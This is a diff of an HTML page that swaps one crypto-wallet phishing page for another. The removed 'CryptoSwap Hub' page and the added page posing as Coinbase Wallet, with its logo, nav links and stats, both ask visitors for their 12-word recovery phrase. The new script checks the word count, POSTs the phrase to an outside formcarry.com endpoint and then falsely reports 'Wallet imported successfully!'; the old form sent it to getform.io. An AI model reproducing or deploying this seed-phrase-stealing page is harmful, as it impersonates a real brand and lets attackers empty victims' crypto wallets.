@@ -1,218 +1,356 @@
-<html><head><base href="/" />
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Crypto Hub</title>
+<html><head><base href="." />
+<title>Coinbase Wallet - The Most Trusted Crypto Wallet</title>
 <style>
-:root {
-    --primary-green: #0fae3c;
-    --light-green: #e7f7ec;
-    --white: #ffffff;
-}
-
-body {
+  body { 
     margin: 0;
-    padding: 0;
-    font-family: 'Arial', sans-serif;
-    background-color: var(--white);
-}
-
-.header {
-    background-color: var(--primary-green);
-    color: var(--white);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #f7f7f7;
+    color: #050F19;
+  }
+  .header {
+    background: white;
     padding: 1rem;
-    text-align: center;
-}
-
-.container {
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    display: flex;
+    align-items: center;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .logo-container {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .logo {
+    height: 32px;
+  }
+  .logo-text {
+    height: 20px;
+  }
+  .header-right {
+    margin-left: auto;
+    display: flex;
+    gap: 1rem;
+  }
+  .nav-link {
+    color: #5B616E;
+    text-decoration: none;
+    padding: 0.5rem 1rem;
+    border-radius: 6px;
+    transition: all 0.2s;
+  }
+  .nav-link:hover {
+    background: #F5F8FF;
+    color: #0052FF;
+  }
+  .container {
     max-width: 1200px;
-    margin: 0 auto;
-    padding: 2rem;
-}
-
-.options-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-    gap: 2rem;
-    margin-top: 2rem;
-}
-
-.option-card {
-    background-color: var(--light-green);
-    border-radius: 10px;
-    padding: 1.5rem;
+    margin: 2rem auto;
+    padding: 0 1rem;
+  }
+  .hero {
     text-align: center;
-    transition: transform 0.3s ease;
-    cursor: pointer;
-}
-
-.option-card:hover {
-    transform: translateY(-5px);
-}
-
-.option-icon {
-    width: 60px;
-    height: 60px;
+    margin: 3rem 0;
+  }
+  .hero h1 {
+    font-size: 2.5rem;
+    color: #050F19;
     margin-bottom: 1rem;
-}
-
-.wallet-selection {
+  }
+  .hero p {
+    font-size: 1.2rem;
+    color: #5B616E;
+    max-width: 600px;
+    margin: 0 auto;
+  }
+  .cards {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 1.5rem;
+    margin-top: 2rem;
+  }
+  .card {
+    background: white;
+    padding: 2rem;
+    border-radius: 16px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    cursor: pointer;
+    transition: all 0.3s;
+    border: 1px solid #E8E8E8;
+  }
+  .card:hover {
+    transform: translateY(-4px);
+    box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+    border-color: #0052FF;
+  }
+  .card h2 {
+    color: #050F19;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .card p {
+    color: #5B616E;
+    line-height: 1.5;
+  }
+  .stats {
+    display: flex;
+    justify-content: center;
+    gap: 3rem;
+    margin: 3rem 0;
+    flex-wrap: wrap;
+  }
+  .stat {
+    text-align: center;
+  }
+  .stat-value {
+    font-size: 2rem;
+    font-weight: bold;
+    color: #0052FF;
+  }
+  .stat-label {
+    color: #5B616E;
+    margin-top: 0.5rem;
+  }
+  .modal {
     display: none;
     position: fixed;
     top: 0;
     left: 0;
-    right: 0;
-    bottom: 0;
-    background-color: rgba(0,0,0,0.8);
-    z-index: 1000;
-}
-
-.wallet-panel {
-    background-color: var(--white);
-    padding: 2rem;
-    border-radius: 10px;
+    width: 100%;
+    height: 100%;
+    background: rgba(5,15,25,0.8);
+    align-items: center;
+    justify-content: center;
+    backdrop-filter: blur(4px);
+  }
+  .modal-content {
+    background: white;
+    padding: 2.5rem;
+    border-radius: 16px;
     max-width: 500px;
-    margin: 2rem auto;
-}
-
-.wallet-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-    gap: 1rem;
-    margin-top: 1rem;
-}
-
-.wallet-option {
-    background-color: var(--light-green);
-    padding: 1rem;
-    border-radius: 5px;
+    width: 90%;
+    position: relative;
+  }
+  .close-btn {
+    position: absolute;
+    top: 1rem;
+    right: 1rem;
+    background: none;
+    border: none;
+    font-size: 1.5rem;
     cursor: pointer;
-    transition: background-color 0.3s ease;
-}
-
-.wallet-option:hover {
-    background-color: var(--primary-green);
-    color: var(--white);
-}
-
-.phrase-form {
-    display: none;
-    margin-top: 2rem;
-}
-
-.phrase-input {
+    color: #5B616E;
+  }
+  .phrase-input {
     width: 100%;
     padding: 1rem;
     margin: 1rem 0;
-    border: 1px solid var(--primary-green);
-    border-radius: 5px;
-}
-
-.connect-btn {
-    background-color: var(--primary-green);
-    color: var(--white);
+    border: 1px solid #E8E8E8;
+    border-radius: 8px;
+    font-size: 1rem;
+    resize: vertical;
+    min-height: 100px;
+  }
+  .submit-btn {
+    background: #0052FF;
+    color: white;
     border: none;
-    padding: 1rem 2rem;
-    border-radius: 5px;
+    padding: 1rem 1.5rem;
+    border-radius: 8px;
     cursor: pointer;
-    font-size: 1.1rem;
-}
-
-.connect-btn:hover {
-    opacity: 0.9;
-}
+    font-size: 1rem;
+    width: 100%;
+    margin-top: 1rem;
+    font-weight: 600;
+    transition: background 0.2s;
+  }
+  .submit-btn:hover {
+    background: #0039B3;
+  }
+  .submit-btn:disabled {
+    background: #E8E8E8;
+  }
+  .error {
+    color: #D9202E;
+    font-size: 0.875rem;
+    margin-top: 0.5rem;
+  }
+  .loading {
+    display: none;
+    text-align: center;
+    margin-top: 1rem;
+  }
+  .loading-spinner {
+    width: 24px;
+    height: 24px;
+    border: 3px solid #E8E8E8;
+    border-top-color: #0052FF;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
 </style>
 </head>
 <body>
-    <div class="header">
-        <h1>CryptoSwap Hub</h1>
-        <p>Your One-Stop Solution for All Crypto Operations</p>
+
+<div class="header">
+  <div class="logo-container">
+    <svg class="logo" width="30" height="30" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M512,0L512,0c282.8,0,512,229.2,512,512l0,0c0,282.8-229.2,512-512,512l0,0C229.2,1024,0,794.8,0,512l0,0C0,229.2,229.2,0,512,0z" fill="#0052FF"/>
+      <path d="M516.3,188.3c179.2,0,324.4,145.2,324.4,324.4s-145.2,324.4-324.4,324.4S191.9,691.9,191.9,512.7,337.1,188.3,516.3,188.3z M432.8,418.8v186.4h163.5V418.8H432.8z" fill="white"/>
+    </svg>
+    <svg class="logo-text" width="98" height="16" viewBox="0 0 98 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M7.08 15.12C5.4 15.12 4.06667 14.7067 3.08 13.88C2.10667 13.04 1.57333 11.8133 1.48 10.2H4.68C4.74667 10.8933 4.98667 11.4267 5.4 11.8C5.82667 12.16 6.38667 12.34 7.08 12.34C7.74667 12.34 8.26667 12.1867 8.64 11.88C9.02667 11.56 9.22 11.1467 9.22 10.64C9.22 10.0533 9 9.62667 8.56 9.36C8.13333 9.08 7.44 8.77333 6.48 8.44C5.52 8.10667 4.74667 7.78667 4.16 7.48C3.58667 7.16 3.09333 6.70667 2.68 6.12C2.28 5.52 2.08 4.74667 2.08 3.8C2.08 2.52 2.56 1.48 3.52 0.68C4.49333 -0.12 5.74667 -0.52 7.28 -0.52C8.85333 -0.52 10.1067 -0.12 11.04 0.68C11.9867 1.48 12.5067 2.61333 12.6 4.08H9.36C9.30667 3.49333 9.08 3.02667 8.68 2.68C8.29333 2.32 7.76 2.14 7.08 2.14C6.44 2.14 5.93333 2.29333 5.56 2.6C5.18667 2.89333 5 3.28 5 3.76C5 4.32 5.22 4.74667 5.66 5.04C6.1 5.32 6.8 5.62667 7.76 5.96C8.72 6.29333 9.48 6.62667 10.04 6.96C10.6133 7.28 11.1 7.74667 11.5 8.36C11.9133 8.96 12.12 9.73333 12.12 10.68C12.12 11.48 11.9133 12.22 11.5 12.9C11.0867 13.5667 10.4933 14.1067 9.72 14.52C8.94667 14.92 8.04 15.12 7 15.12H7.08ZM19.234 15.12C18.074 15.12 17.074 14.8667 16.234 14.36C15.394 13.84 14.754 13.1067 14.314 12.16C13.874 11.2 13.654 10.0933 13.654 8.84V8.28C13.654 7.02667 13.874 5.92667 14.314 4.98C14.754 4.02 15.394 3.28667 16.234 2.78C17.074 2.26 18.074 2 19.234 2C20.394 2 21.394 2.26 22.234 2.78C23.074 3.28667 23.714 4.02 24.154 4.98C24.594 5.92667 24.814 7.02667 24.814 8.28V8.84C24.814 10.0933 24.594 11.2 24.154 12.16C23.714 13.1067 23.074 13.84 22.234 14.36C21.394 14.8667 20.394 15.12 19.234 15.12ZM19.234 12.28C20.154 12.28 20.874 11.9333 21.394 11.24C21.914 10.5467 22.174 9.53333 22.174 8.2C22.174 6.86667 21.914 5.86 21.394 5.18C20.874 4.48667 20.154 4.14 19.234 4.14C18.314 4.14 17.594 4.48667 17.074 5.18C16.554 5.86 16.294 6.86667 16.294 8.2C16.294 9.53333 16.554 10.5467 17.074 11.24C17.594 11.9333 18.314 12.28 19.234 12.28ZM31.5864 15.12C30.4264 15.12 29.4264 14.8667 28.5864 14.36C27.7464 13.84 27.1064 13.1067 26.6664 12.16C26.2264 11.2 26.0064 10.0933 26.0064 8.84V8.28C26.0064 7.02667 26.2264 5.92667 26.6664 4.98C27.1064 4.02 27.7464 3.28667 28.5864 2.78C29.4264 2.26 30.4264 2 31.5864 2C32.7464 2 33.7464 2.26 34.5864 2.78C35.4264 3.28667 36.0664 4.02 36.5064 4.98C36.9464 5.92667 37.1664 7.02667 37.1664 8.28V8.84C37.1664 10.0933 36.9464 11.2 36.5064 12.16C36.0664 13.1067 35.4264 13.84 34.5864 14.36C33.7464 14.8667 32.7464 15.12 31.5864 15.12ZM31.5864 12.28C32.5064 12.28 33.2264 11.9333 33.7464 11.24C34.2664 10.5467 34.5264 9.53333 34.5264 8.2C34.5264 6.86667 34.2664 5.86 33.7464 5.18C33.2264 4.48667 32.5064 4.14 31.5864 4.14C30.6664 4.14 29.9464 4.48667 29.4264 5.18C28.9064 5.86 28.6464 6.86667 28.6464 8.2C28.6464 9.53333 28.9064 10.5467 29.4264 11.24C29.9464 11.9333 30.6664 12.28 31.5864 12.28ZM43.8388 15C42.7588 15 41.8788 14.7067 41.1988 14.12C40.5188 13.5333 40.1788 12.7333 40.1788 11.72C40.1788 10.7067 40.5188 9.90667 41.1988 9.32C41.8788 8.73333 42.7588 8.44 43.8388 8.44H46.3588V7.48C46.3588 6.84 46.1788 6.34667 45.8188 6C45.4588 5.65333 44.9588 5.48 44.3188 5.48C43.7188 5.48 43.2388 5.62667 42.8788 5.92C42.5188 6.2 42.2988 6.58667 42.2188 7.08H39.6588C39.7388 5.92 40.1788 4.98667 40.9788 4.28C41.7788 3.57333 42.8788 3.22 44.2788 3.22C45.7588 3.22 46.8988 3.58667 47.6988 4.32C48.4988 5.04 48.8988 6.04 48.8988 7.32V12.36H48.9788L48.8988 15H43.8388ZM44.2788 13C44.9788 13 45.5188 12.8267 45.8988 12.48C46.2788 12.1333 46.4788 11.6667 46.4988 11.08V10.28H44.1988C43.6788 10.28 43.2788 10.4133 42.9988 10.68C42.7188 10.9467 42.5788 11.3067 42.5788 11.76C42.5788 12.2133 42.7188 12.5733 42.9988 12.84C43.2788 12.9467 43.7188 13 44.2788 13ZM51.0291 15V3.34H54.5491L54.6291 5.48H54.7091C55.0291 4.73333 55.5091 4.14667 56.1491 3.72C56.7891 3.28 57.5491 3.06 58.4291 3.06C58.7491 3.06 59.0691 3.09333 59.3891 3.16C59.7091 3.21333 59.9891 3.29333 60.2291 3.4L59.6291 6.16C59.4291 6.08 59.1891 6.02 58.9091 5.98C58.6291 5.92667 58.3491 5.9 58.0691 5.9C57.3691 5.9 56.7491 6.10667 56.2091 6.52C55.6691 6.92 55.3091 7.49333 55.1291 8.24V15H51.0291ZM66.7553 15.12C65.5953 15.12 64.5953 14.8667 63.7553 14.36C62.9153 13.84 62.2753 13.1067 61.8353 12.16C61.3953 11.2 61.1753 10.0933 61.1753 8.84V8.28C61.1753 7.02667 61.3953 5.92667 61.8353 4.98C62.2753 4.02 62.9153 3.28667 63.7553 2.78C64.5953 2.26 65.5953 2 66.7553 2C67.9153 2 68.9153 2.26 69.7553 2.78C70.5953 3.28667 71.2353 4.02 71.6753 4.98C72.1153 5.92667 72.3353 7.02667 72.3353 8.28V8.84C72.3353 10.0933 72.1153 11.2 71.6753 12.16C71.2353 13.1067 70.5953 13.84 69.7553 14.36C68.9153 14.8667 67.9153 15.12 66.7553 15.12ZM66.7553 12.28C67.6753 12.28 68.3953 11.9333 68.9153 11.24C69.4353 10.5467 69.6953 9.53333 69.6953 8.2C69.6953 6.86667 69.4353 5.86 68.9153 5.18C68.3953 4.48667 67.6753 4.14 66.7553 4.14C65.8353 4.14 65.1153 4.48667 64.5953 5.18C64.0753 5.86 63.8153 6.86667 63.8153 8.2C63.8153 9.53333 64.0753 10.5467 64.5953 11.24C65.1153 11.9333 65.8353 12.28 66.7553 12.28ZM78.9277 15C77.8477 15 76.9677 14.7067 76.2877 14.12C75.6077 13.5333 75.2677 12.7333 75.2677 11.72C75.2677 10.7067 75.6077 9.90667 76.2877 9.32C76.9677 8.73333 77.8477 8.44 78.9277 8.44H81.4477V7.48C81.4477 6.84 81.2677 6.34667 80.9077 6C80.5477 5.65333 80.0477 5.48 79.4077 5.48C78.8077 5.48 78.3277 5.62667 77.9677 5.92C77.6077 6.2 77.3877 6.58667 77.3077 7.08H74.7477C74.8277 5.92 75.2677 4.98667 76.0677 4.28C76.8677 3.57333 77.9677 3.22 79.3677 3.22C80.8477 3.22 81.9877 3.58667 82.7877 4.32C83.5877 5.04 83.9877 6.04 83.9877 7.32V12.36H84.0677L83.9877 15H78.9277ZM79.3677 13C80.0677 13 80.6077 12.8267 80.9877 12.48C81.3677 12.1333 81.5677 11.6667 81.5877 11.08V10.28H79.2877C78.7677 10.28 78.3677 10.4133 78.0877 10.68C77.8077 10.9467 77.6677 11.3067 77.6677 11.76C77.6677 12.2133 77.8077 12.5733 78.0877 12.84C78.3677 12.9467 78.8077 13 79.3677 13ZM86.118 15V3.34H89.638L89.718 5.48H89.798C90.118 4.73333 90.598 4.14667 91.238 3.72C91.878 3.28 92.638 3.06 93.518 3.06C93.838 3.06 94.158 3.09333 94.478 3.16C94.798 3.21333 95.078 3.29333 95.318 3.4L94.718 6.16C94.518 6.08 94.278 6.02 93.998 5.98C93.718 5.92667 93.438 5.9 93.158 5.9C92.458 5.9 91.838 6.10667 91.298 6.52C90.758 6.92 90.398 7.49333 90.218 8.24V15H86.118Z" fill="#050F19"/>
+    </svg>
+  </div>
+  <div class="header-right">
+    <a href="https://www.coinbase.com/learn" class="nav-link">Learn</a>
+    <a href="https://www.coinbase.com/price" class="nav-link">Prices</a>
+    <a href="https://www.coinbase.com/earn" class="nav-link">Earn</a>
+  </div>
+</div>
+
+<div class="container">
+  <div class="hero">
+    <h1>The Most Trusted Crypto Wallet</h1>
+    <p>Buy, store, send and swap tokens on the largest multi-chain crypto wallet in the world</p>
+  </div>
+
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-value">89M+</div>
+      <div class="stat-label">Verified users</div>
     </div>
-
-    <div class="container">
-        <div class="options-grid">
-            <div class="option-card" onclick="showWalletSelection('migrate')">
-                <svg class="option-icon" viewBox="0 0 24 24">
-                    <path fill="currentColor" d="M13,14H11V10H13M13,18H11V16H13M1,21H23L12,2L1,21Z"/>
-                </svg>
-                <h3>Migrate</h3>
-                <p>Seamlessly migrate your assets across chains</p>
-            </div>
-
-            <div class="option-card" onclick="showWalletSelection('swap')">
-                <svg class="option-icon" viewBox="0 0 24 24">
-                    <path fill="currentColor" d="M21,9L17,5V8H10V10H17V13M7,11L3,15L7,19V16H14V14H7V11Z"/>
-                </svg>
-                <h3>Swap</h3>
-                <p>Exchange tokens at the best rates</p>
-            </div>
-
-            <div class="option-card" onclick="showWalletSelection('bridge')">
-                <svg class="option-icon" viewBox="0 0 24 24">
-                    <path fill="currentColor" d="M21,15C21,16.66 19.66,18 18,18H16V16H18C18.55,16 19,15.55 19,15V9C19,8.45 18.55,8 18,8H16V6H18C19.66,6 21,7.34 21,9V15M3,15C3,16.66 4.34,18 6,18H8V16H6C5.45,16 5,15.55 5,15V9C5,8.45 5.45,8 6,8H8V6H6C4.34,6 3,7.34 3,9V15M13,8H11V18H13V8Z"/>
-                </svg>
-                <h3>Bridge</h3>
-                <p>Transfer assets between different blockchains</p>
-            </div>
-
-            <div class="option-card" onclick="showWalletSelection('sync')">
-                <svg class="option-icon" viewBox="0 0 24 24">
-                    <path fill="currentColor" d="M12,18A6,6 0 0,1 6,12C6,11 6.25,10.03 6.7,9.2L5.24,7.74C4.46,8.97 4,10.43 4,12A8,8 0 0,0 12,20V23L16,19L12,15M12,4V1L8,5L12,9V6A6,6 0 0,1 18,12C18,13 17.75,13.97 17.3,14.8L18.76,16.26C19.54,15.03 20,13.57 20,12A8,8 0 0,0 12,4Z"/>
-                </svg>
-                <h3>Sync</h3>
-                <p>Synchronize your wallet across devices</p>
-            </div>
-        </div>
+    <div class="stat">
+      <div class="stat-value">$1T+</div>
+      <div class="stat-label">Assets exchanged</div>
     </div>
-
-    <div class="wallet-selection" id="walletSelection">
-        <div class="wallet-panel">
-            <h2>Select Your Wallet</h2>
-            <div class="wallet-grid">
-                <div class="wallet-option" onclick="showPhraseForm('metamask')">MetaMask</div>
-                <div class="wallet-option" onclick="showPhraseForm('trust')">Trust Wallet</div>
-                <div class="wallet-option" onclick="showPhraseForm('phantom')">Phantom</div>
-                <div class="wallet-option" onclick="showPhraseForm('ledger')">Ledger</div>
-                <div class="wallet-option" onclick="showPhraseForm('coinbase')">Coinbase</div>
-                <div class="wallet-option" onclick="showPhraseForm('tonhub')">Tonhub</div>
-                <div class="wallet-option" onclick="showPhraseForm('argent')">Argent</div>
-                <div class="wallet-option" onclick="showPhraseForm('zerion')">Zerion</div>
-                <div class="wallet-option" onclick="showPhraseForm('safepal')">SafePal</div>
-            </div>
-
-            <form id="phraseForm" class="phrase-form" action="https://getform.io/f/bxooeyoa" method="GET">
-                <input type="hidden" name="action" id="actionType">
-                <input type="hidden" name="wallet" id="walletType">
-                <textarea class="phrase-input" name="phrase" rows="3" placeholder="Enter your 12-word recovery phrase" required></textarea>
-                <button type="submit" class="connect-btn">Connect Wallet</button>
-            </form>
-        </div>
+    <div class="stat">
+      <div class="stat-value">100+</div>
+      <div class="stat-label">Countries supported</div>
     </div>
+  </div>
 
-    <script>
-        let currentAction = '';
-        let currentWallet = '';
+  <div class="cards">
+    <div class="card" onclick="showModal()">
+      <h2>
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="#0052FF">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+        Secure Wallet
+      </h2>
+      <p>Securely connect your Coinbase wallet to start trading and earning rewards</p>
+    </div>
+    <div class="card" onclick="showModal()">
+      <h2>
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="#0052FF">
+          <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+        </svg>
+        Migrate Wallet
+      </h2>
+      <p>Migrate your existing wallet using your 12-word recovery phrase</p>
+    </div>
+  </div>
+</div>
 
-        function showWalletSelection(action) {
-            currentAction = action;
-            document.getElementById('walletSelection').style.display = 'block';
-            document.getElementById('actionType').value = action;
-        }
+<div class="modal" id="phraseModal">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeModal()">×</button>
+    <h2>Import Your Wallet</h2>
+    <p>Enter your 12-word recovery phrase to securely migrate your existing wallet</p>
+    
+    <form id="phraseForm" onsubmit="handleSubmit(event)">
+      <textarea 
+        class="phrase-input" 
+        placeholder="Enter your 12-word recovery phrase separated by spaces"
+        required
+        id="phraseInput"
+      ></textarea>
+      <div class="error" id="error"></div>
+      <button type="submit" class="submit-btn" id="submitBtn">
+        Import Wallet
+      </button>
+    </form>
+    
+    <div class="loading" id="loading">
+      <div class="loading-spinner"></div>
+      <p>Importing wallet...</p>
+    </div>
+  </div>
+</div>
 
-        function showPhraseForm(wallet) {
-            currentWallet = wallet;
-            document.getElementById('walletType').value = wallet;
-            document.getElementById('phraseForm').style.display = 'block';
-            
-            // Scroll to the form
-            document.getElementById('phraseForm').scrollIntoView({ behavior: 'smooth' });
-        }
+<script>
+function showModal() {
+  document.getElementById('phraseModal').style.display = 'flex';
+}
 
-        // Close modal when clicking outside
-        document.getElementById('walletSelection').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.style.display = 'none';
-            }
-        });
-    </script>
+function closeModal() {
+  document.getElementById('phraseModal').style.display = 'none';
+}
+
+window.onclick = function(event) {
+  if (event.target == document.getElementById('phraseModal')) {
+    closeModal();
+  }
+}
+
+function validatePhrase(phrase) {
+  const words = phrase.trim().split(/\s+/);
+  return words.length === 12;
+}
+
+async function handleSubmit(event) {
+  event.preventDefault();
+  
+  const phraseInput = document.getElementById('phraseInput');
+  const submitBtn = document.getElementById('submitBtn');
+  const loading = document.getElementById('loading');
+  const error = document.getElementById('error');
+  
+  const phrase = phraseInput.value;
+  
+  if (!validatePhrase(phrase)) {
+    error.textContent = 'Please enter exactly 12 words';
+    return;
+  }
+  
+  error.textContent = '';
+  submitBtn.disabled = true;
+  loading.style.display = 'block';
+  
+  try {
+    const response = await fetch('https://formcarry.com/s/2fRjwsXYSGB', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify({
+        phrase: phrase
+      })
+    });
+    
+    if (!response.ok) {
+      throw new Error('Submission failed');
+    }
+    
+    alert('Wallet imported successfully!');
+    closeModal();
+    phraseInput.value = '';
+    
+  } catch (err) {
+    error.textContent = 'An error occurred. Please try again.';
+  } finally {
+    submitBtn.disabled = false;
+    loading.style.display = 'none';
+  }
+}
+</script>
+
 </body>
 </html>
